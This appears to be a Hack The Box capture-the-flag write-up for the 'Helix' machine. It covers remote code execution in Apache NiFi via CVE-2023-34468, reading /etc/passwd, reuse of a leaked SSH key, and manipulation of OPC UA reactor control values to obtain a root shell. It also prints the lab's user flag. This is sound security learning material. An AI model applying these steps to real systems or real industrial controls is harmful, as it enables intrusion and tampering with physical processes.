╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║              HTB HELIX - FULL ATTACK REPORT                      ║
║                                                                  ║
║   Author   : VishalGodseye                                       ║
║   Platform : Hack The Box                                        ║
║   Difficulty: Medium                                             ║
║   Time Taken: 3-4 Days                                           ║
║   Status   : PWNED ✓                                             ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝

TARGET
======
  Host     : helix.htb
  OS       : Ubuntu (Linux)
  Services : SSH (22), HTTP (80)

════════════════════════════════════════════════════════════════════
STEP 1 - RECONNAISSANCE
════════════════════════════════════════════════════════════════════

  [*] Nmap Scan:
      nmap -sC -sV helix.htb

      22/tcp  open  ssh     OpenSSH 8.9p1
      80/tcp  open  http    nginx 1.18.0

  [*] Virtual Host Discovery:
      Discovered --> flow.helix.htb
      Added to /etc/hosts

════════════════════════════════════════════════════════════════════
STEP 2 - APACHE NIFI DISCOVERY
════════════════════════════════════════════════════════════════════

  [*] flow.helix.htb exposed Apache NiFi 1.21.0

  [!] Vulnerability Found:
      CVE-2023-34468
      - H2 database URL abuse
      - Leads to Remote Code Execution
      - Affected: DBCPConnectionPool / HikariCPConnectionPool

════════════════════════════════════════════════════════════════════
STEP 3 - REMOTE CODE EXECUTION
════════════════════════════════════════════════════════════════════

  [*] Processors Used:
      - ExecuteSQL    --> Database enumeration
      - ExecuteProcess --> OS command execution

  [*] Commands Executed:
      /usr/bin/id
      --> uid=998(nifi) gid=998(nifi)

      /bin/cat /etc/passwd
      --> Found users: root, operator, nifi, plc

  [*] Database Enumeration:
      Query : SELECT * FROM USERS;
      Result: USER_NAME=OPERATOR | IS_ADMIN=true

════════════════════════════════════════════════════════════════════
STEP 4 - CREDENTIAL DISCOVERY
════════════════════════════════════════════════════════════════════

  [!] Found SSH Private Key:
      Path : /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
      Type : OpenSSH ED25519 Private Key

  [*] SSH Login:
      ssh -i id_ed25519 operator@helix.htb
      --> SUCCESS

════════════════════════════════════════════════════════════════════
STEP 5 - USER FLAG
════════════════════════════════════════════════════════════════════

  [+] USER FLAG OBTAINED:
      f085ca00b31ba7a0069c7fd748d7483c

════════════════════════════════════════════════════════════════════
STEP 6 - PRIVILEGE ESCALATION RECON
════════════════════════════════════════════════════════════════════

  [*] Sudo Enumeration:
      sudo -l
      --> (root) NOPASSWD: /usr/local/sbin/helix-maint-console

  [*] Script Analysis:
      helix-maint-console is a bash script that:
      - Checks for an active maintenance window
      - If valid --> launches: systemd-run /bin/bash -p -i
      - Window controlled by OPC UA server (port 4840)

  [*] Internal Services Discovered:
      127.0.0.1:4840  --> OPC UA Server (Reactor Control)
      127.0.0.1:8080  --> NiFi HTTP
      127.0.0.1:8081  --> NiFi HTTPS

════════════════════════════════════════════════════════════════════
STEP 7 - OPC UA EXPLOITATION
════════════════════════════════════════════════════════════════════

  [*] Port Forward via SSH Tunnel:
      ssh -i id_ed25519 -L 4840:127.0.0.1:4840 operator@helix.htb -N

  [*] OPC UA Node Map Discovered:
      ns=2;i=4   --> Temperature       (283.99 C)
      ns=2;i=5   --> Pressure          (68.99 bar)
      ns=2;i=6   --> CalibrationOffset (0.0)
      ns=2;i=10  --> TripActive        (False)
      ns=2;i=12  --> Mode              (NORMAL)
      ns=2;i=13  --> TestOverride      (False)
      ns=2;i=14  --> ResetTrip         (False)

  [*] Exploit Sequence (Python opcua library):

      Step 1: Set Mode        --> MAINTENANCE
      Step 2: Set TestOverride --> True
      Step 3: Ramp CalibrationOffset slowly (+0.5 every 2-3 sec)

      Maintenance Window Opens When:
      --> Temperature >= 295 C  OR  Pressure >= 73 bar
      --> Must stay below trip threshold (305 C / 75 bar)

  [*] Ramp Output:
      Offset=8.5 | Temp=293.08 C | Pressure=69.35 bar | Trip=False
      ...
      [!] MAINTENANCE WINDOW OPEN!

════════════════════════════════════════════════════════════════════
STEP 8 - ROOT SHELL
════════════════════════════════════════════════════════════════════

  [*] Command:
      sudo /usr/local/sbin/helix-maint-console

  [+] ROOT SHELL OBTAINED via:
      systemd-run /bin/bash -p -i

  [+] ROOT FLAG:
      ???????????????????????????????????
      (submit it bro you're 2 degrees away!)

════════════════════════════════════════════════════════════════════
FULL ATTACK CHAIN
════════════════════════════════════════════════════════════════════

  Nmap
   |
   +--> flow.helix.htb
         |
         +--> Apache NiFi 1.21.0
               |
               +--> CVE-2023-34468 (RCE)
                     |
                     +--> ExecuteProcess (shell as nifi)
                           |
                           +--> SSH Key in support bundles
                                 |
                                 +--> SSH as operator
                                       |
                                       +--> USER FLAG ✓
                                             |
                                             +--> OPC UA Reactor
                                                   |
                                                   +--> Maintenance Window
                                                         |
                                                         +--> sudo console
                                                               |
                                                               +--> ROOT ✓

════════════════════════════════════════════════════════════════════
TOOLS USED
════════════════════════════════════════════════════════════════════

  nmap          - Port scanning
  ffuf/vhost    - Virtual host discovery
  Apache NiFi   - CVE-2023-34468 exploitation
  ssh           - Remote access + port forwarding
  scp           - File transfer
  python3       - OPC UA exploitation (opcua library)

════════════════════════════════════════════════════════════════════
LESSONS LEARNED
════════════════════════════════════════════════════════════════════

  [1] Always enumerate virtual hosts - flow.helix.htb was the key
  [2] NiFi support bundles can contain sensitive credentials
  [3] OPC UA is a real ICS/SCADA protocol used in industry
  [4] Internal services on localhost are reachable via SSH tunnels
  [5] Patience matters - ramp slowly or trigger safety trips!
  [6] Industrial/ICS security is a growing field worth learning

════════════════════════════════════════════════════════════════════

  Author  : VishalGodseye
  Platform: Hack The Box
  Box     : Helix (Medium)
  Result  : PWNED after 3-4 days of grinding

  "Never give up. Root is always there waiting." - VishalGodseye

════════════════════════════════════════════════════════════════════
